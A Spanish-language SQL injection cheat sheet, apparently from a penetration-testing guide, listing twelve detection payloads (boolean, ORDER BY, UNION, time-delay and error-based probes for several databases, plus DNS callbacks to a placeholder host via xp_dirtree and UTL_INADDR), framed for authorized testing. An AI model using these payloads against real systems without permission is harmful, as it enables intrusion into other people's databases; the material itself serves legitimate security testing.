# 🗡️ SQL injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Booleano de cadena: verdadero/falso

**Objetivo:** Usar un filtro de un registro propio cuyo valor cae entre comillas; comparar ambas requests.

```http
GET /api/items?name=prueba%27%20AND%20%271%27%3D%271%27--%20 HTTP/1.1
Host: {ORIGEN}

GET /api/items?name=prueba%27%20AND%20%271%27%3D%272%27--%20 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Debe cambiar el predicado, no solo el estado HTTP; repetir con un filtro literal y controlar caché.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 2. Booleano numérico

**Objetivo:** Solo si el parámetro se inserta como número sin comillas.

```http
GET /api/items?id=1%20AND%201%3D1 HTTP/1.1
Host: {ORIGEN}

GET /api/items?id=1%20AND%201%3D2 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** La diferencia debe reproducirse sobre el mismo objeto; un 400 puede ser validación de tipo normal.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 3. Número de columnas con ORDER BY

**Objetivo:** En una consulta SELECT con salida visible, probar únicamente índices bajos y autorizados.

```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

**Interpretación:** El primer índice que causa error puede acotar columnas; exige contexto compatible y un control sin inyección.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 4. UNION con marcador propio

**Objetivo:** Después de conocer el número de columnas y tipos; ejemplo para dos columnas texto.

```sql
' UNION SELECT NULL,'prueba-123'--
```

**Interpretación:** Confirmar que el marcador procede de la fila UNION y no de un reflejo de la entrada.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 5. Retardo PostgreSQL

**Objetivo:** Medir un segundo en laboratorio o ventana autorizada; se necesita PostgreSQL y contexto booleano.

```sql
' AND (SELECT 1 FROM pg_sleep(1))=1--
```

**Interpretación:** Medir varias veces frente al mismo predicado sin pg_sleep; latencia de red no es confirmación.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 6. Retardo MySQL

**Objetivo:** Usar una pausa corta con un motor MySQL compatible.

```sql
' AND IF(1=1,SLEEP(1),0)--
```

**Interpretación:** Comparar con IF(1=2,SLEEP(1),0); no emplear pausas largas ni automatización intensiva.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 7. Retardo Microsoft SQL Server

**Objetivo:** Solo en un entorno aislado con consultas apiladas permitidas.

```sql
'; WAITFOR DELAY '00:00:01'--
```

**Interpretación:** El driver puede bloquear sentencias apiladas; fallo de esta variante no descarta SQLi.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 8. OAST DNS Microsoft SQL Server

**Objetivo:** Laboratorio o permiso expreso; subdominio único sin datos en la consulta.

```sql
'; EXEC master..xp_dirtree '\\prueba-123.{CONTROLLED_HOST}\a'--
```

**Interpretación:** Correlacionar solo DNS; esta función puede estar deshabilitada y una conexión SMB puede exponer autenticación, por lo que requiere aislamiento.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 9. OAST DNS Oracle

**Objetivo:** Laboratorio Oracle con UTL_INADDR permitido; no concatenar datos de tablas.

```sql
SELECT UTL_INADDR.get_host_address('prueba-123.{CONTROLLED_HOST}') FROM dual
```

**Interpretación:** Una ACL de red o falta de privilegios puede impedir callback aunque exista SQLi.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 10. UNION con NULL para tipos/columnas

**Objetivo:** Después de confirmar contexto SELECT, probar cantidad de columnas sin leer tablas.

```sql
' UNION SELECT NULL,NULL--
```

**Interpretación:** La aceptación puede indicar dos columnas compatibles; repetir con una y tres como controles.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 11. Error visible de conversión PostgreSQL

**Objetivo:** Solo si la aplicación expone errores del motor y la expresión entra en WHERE.

```sql
' AND 1=CAST('prueba-123' AS INTEGER)--
```

**Interpretación:** Un error de conversión con el marcador atribuido a PostgreSQL da señal de evaluación; un 500 genérico no.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 12. Error visible de conversión SQL Server

**Objetivo:** Motor T-SQL; condición que fuerza CONVERT en una consulta de prueba.

```sql
' AND 1=CONVERT(int,'prueba-123')--
```

**Interpretación:** El mensaje de conversión puede contener el marcador; no funciona si la consulta captura errores o no usa SQL Server.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/sql-injection/cheat-sheet).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
